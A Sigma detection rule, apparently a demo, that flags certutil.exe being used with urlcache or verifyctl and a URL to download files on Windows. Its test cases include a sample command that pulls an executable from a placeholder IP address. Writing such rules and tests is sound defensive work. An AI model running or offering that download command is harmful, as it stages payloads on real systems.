title: Certutil Used To Download File
id: 6f1c2a0e-3b4d-4c1a-9e7f-0a1b2c3d4e02
status: stable
version: 1
level: high
author: ANVIL demo
description: Detects certutil.exe with urlcache/split flags and a URL, a common living-off-the-land download technique.
references:
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.command-and-control
  - attack.t1105
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - 'urlcache'
      - 'verifyctl'
  url:
    CommandLine|contains:
      - 'http://'
      - 'https://'
  condition: selection and url
falsepositives:
  - Admins legitimately refreshing CRLs from internal URLs
tests:
  true_positives:
    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.7/a.exe a.exe'}
  true_negatives:
    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil.exe -verify C:\certs\root.cer'}
    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -urlcache *'}
